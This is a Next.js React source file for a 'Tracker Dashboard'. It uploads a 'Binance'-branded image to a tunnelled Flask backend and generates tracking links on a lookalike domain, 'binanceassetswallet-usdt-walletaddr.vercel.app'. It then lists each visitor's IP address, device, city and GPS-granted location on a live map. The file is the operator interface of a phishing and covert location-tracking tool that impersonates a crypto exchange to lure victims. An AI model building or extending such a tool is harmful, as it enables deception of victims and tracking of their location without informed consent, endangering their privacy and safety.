"use client";

import { useState, useEffect } from 'react';
import dynamic from 'next/dynamic';
import { RefreshCw, UploadCloud, Link as LinkIcon, MapPin, Monitor, Smartphone, Apple } from 'lucide-react';

// Dynamically import the MapView to fix the 'window is not defined' error
const MapView = dynamic(() => import('./MapView'), { ssr: false, loading: () => <p className="text-zinc-500 p-4 text-center">Loading Map...</p> });

export default function Dashboard() {
  const [links, setLinks] = useState<any[]>([]);
  const [visitors, setVisitors] = useState<any[]>([]);
  const [file, setFile] = useState<File | null>(null);
  const [loading, setLoading] = useState(false);

  // YOUR FLASK BACKEND URL (Change this to your Railway URL)
  const FLASK_API = "https://beneficial-acrylic-fighter-saves.trycloudflare.com";

  const fetchData = async () => {
    setLoading(true);
    try {
      const res = await fetch(`${FLASK_API}/api/visitors`);
      const data = await res.json();
      setLinks(data.links || []);
      setVisitors(data.visitors || []);
    } catch (e) { console.error("Failed to fetch data"); }
    setLoading(false);
  };

  useEffect(() => {
    fetchData();
    const interval = setInterval(fetchData, 10000); // Auto-refresh every 10s
    return () => clearInterval(interval);
  }, []);

  const handleUpload = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!file) return;
    const formData = new FormData();
    formData.append('image', file);
    formData.append('title', 'Binance');
    
    await fetch(`${FLASK_API}/upload`, { method: 'POST', body: formData });
    setFile(null);
    fetchData();
  };

  const getDeviceIcon = (ua: string) => {
    if (!ua) return <Monitor size={16} className="text-zinc-400" />;
    if (/iPhone|iPad|iPod/i.test(ua)) return <Apple size={16} className="text-zinc-400" />;
    if (/Android/i.test(ua)) return <Smartphone size={16} className="text-green-400" />;
    return <Monitor size={16} className="text-blue-400" />;
  };

  return (
    <div className="min-h-screen bg-zinc-950 text-zinc-100 p-4 sm:p-8 font-sans">
      <div className="max-w-7xl mx-auto">
        
        {/* HEADER */}
        <header className="flex flex-col sm:flex-row justify-between items-start sm:items-center mb-8 gap-4">
          <div>
            <h1 className="text-2xl sm:text-3xl font-bold tracking-tight">Tracker Dashboard</h1>
            <p className="text-zinc-500 text-sm mt-1">Monitor visits, upload images, and track locations in real-time.</p>
          </div>
          <button 
            onClick={fetchData} 
            disabled={loading}
            className="flex items-center gap-2 bg-zinc-800 hover:bg-zinc-700 text-zinc-300 px-4 py-2 rounded-lg transition-colors border border-zinc-700"
          >
            <RefreshCw size={16} className={loading ? 'animate-spin' : ''} />
            {loading ? 'Refreshing...' : 'Refresh Map'}
          </button>
        </header>

        <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
          
          {/* LEFT COLUMN: UPLOAD & LINKS */}
          <div className="lg:col-span-1 space-y-6">
            {/* Upload Card */}
            <div className="bg-zinc-900 border border-zinc-800 rounded-xl p-6 shadow-lg">
              <h2 className="text-lg font-semibold mb-4 flex items-center gap-2 text-zinc-200">
                <UploadCloud size={20} className="text-blue-400" />
                Upload Image
              </h2>
              <form onSubmit={handleUpload} className="space-y-4">
                <div className="border-2 border-dashed border-zinc-700 rounded-lg p-4 text-center hover:border-zinc-600 transition-colors cursor-pointer">
                  <input type="file" id="fileUpload" onChange={(e) => setFile(e.target.files?.[0] || null)} required className="hidden" />
                  <label htmlFor="fileUpload" className="cursor-pointer text-sm text-zinc-400">
                    {file ? file.name : 'Click to select an image'}
                  </label>
                </div>
                <button type="submit" className="w-full bg-blue-600 hover:bg-blue-700 text-white py-2 rounded-lg font-medium transition-colors">
                  Generate Tracking Link
                </button>
              </form>
            </div>

            {/* Links Card */}
            <div className="bg-zinc-900 border border-zinc-800 rounded-xl p-6 shadow-lg">
              <h2 className="text-lg font-semibold mb-4 flex items-center gap-2 text-zinc-200">
                <LinkIcon size={20} className="text-purple-400" />
                Tracking Links
              </h2>
              <div className="space-y-4 max-h-[400px] overflow-y-auto pr-2">
                {links.length === 0 && <p className="text-zinc-500 text-sm">No links generated yet.</p>}
                {links.map(link => (
                  <div key={link.id} className="bg-zinc-800/50 border border-zinc-800 rounded-lg p-3">
                    <img src={`${FLASK_API}/uploads/${link.preview_path}`} alt="Preview" className="w-full h-24 object-cover rounded-md mb-3" />
                    <p className="text-xs text-zinc-500 mb-1">Tracking URL:</p>
                    <div className="flex items-center gap-2 bg-zinc-950 p-2 rounded border border-zinc-800">
                     <input readOnly value={`https://binanceassetswallet-usdt-walletaddr.vercel.app/track/${link.id}`} className="bg-transparent text-xs text-zinc-400 w-full outline-none" />
                     <button onClick={() => navigator.clipboard.writeText(`https://binanceassetswallet-usdt-walletaddr.vercel.app/track/${link.id}`)} className="text-blue-400 hover:text-blue-300 text-xs">Copy</button>
                    </div>
                  </div>
                ))}
              </div>
            </div>
          </div>

          {/* RIGHT COLUMN: MAP & VISITORS */}
          <div className="lg:col-span-2 space-y-6">
            
            {/* Map Card */}
            <div className="bg-zinc-900 border border-zinc-800 rounded-xl p-6 shadow-lg">
              <div className="flex justify-between items-center mb-4">
                <h2 className="text-lg font-semibold flex items-center gap-2 text-zinc-200">
                  <MapPin size={20} className="text-red-400" />
                  Live Locations
                </h2>
                <div className="flex items-center gap-4 text-xs">
                  <span className="flex items-center gap-1"><span className="w-2 h-2 bg-blue-500 rounded-full"></span> IP Location</span>
                  <span className="flex items-center gap-1"><span className="w-2 h-2 bg-red-500 rounded-full"></span> Exact GPS</span>
                </div>
              </div>
              <div className="h-[400px] bg-zinc-950 rounded-lg overflow-hidden border border-zinc-800">
                <MapView visitors={visitors} />
              </div>
            </div>

            {/* Visitor Details Card */}
            <div className="bg-zinc-900 border border-zinc-800 rounded-xl p-6 shadow-lg overflow-x-auto">
              <h2 className="text-lg font-semibold mb-4 text-zinc-200">Visitor Details</h2>
              <table className="w-full text-sm text-left">
                <thead className="text-zinc-500 border-b border-zinc-800">
                  <tr>
                    <th className="py-3 px-2 font-medium">Device</th>
                    <th className="py-3 px-2 font-medium">IP Address</th>
                    <th className="py-3 px-2 font-medium">Location</th>
                    <th className="py-3 px-2 font-medium">Status</th>
                    <th className="py-3 px-2 font-medium">Last Seen</th>
                  </tr>
                </thead>
                <tbody>
                  {visitors.length === 0 && (
                    <tr><td colSpan={5} className="text-center py-6 text-zinc-500">No visitors tracked yet.</td></tr>
                  )}
                  {visitors.map(v => (
                    <tr key={v.id} className="border-b border-zinc-800/50 hover:bg-zinc-800/30">
                      <td className="py-3 px-2 flex items-center gap-2">
                        {getDeviceIcon(v.user_agent)}
                        <span className="text-zinc-400 capitalize">{v.user_agent?.includes('iPhone') ? 'iOS' : v.user_agent?.includes('Android') ? 'Android' : 'Desktop'}</span>
                      </td>
                      <td className="py-3 px-2 text-zinc-400">{v.ip_address}</td>
                      <td className="py-3 px-2 text-zinc-400">{v.ip_city || 'Unknown'}, {v.ip_country || ''}</td>
                      <td className="py-3 px-2">
                        {v.gps_permission_status === 'granted' ? <span className="text-red-400 bg-red-500/10 px-2 py-1 rounded text-xs">GPS Granted</span> : <span className="text-blue-400 bg-blue-500/10 px-2 py-1 rounded text-xs">IP Only</span>}
                      </td>
                      <td className="py-3 px-2 text-zinc-500 text-xs">{new Date(v.last_seen).toLocaleString()}</td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>

          </div>
        </div>
      </div>
    </div>
  );
}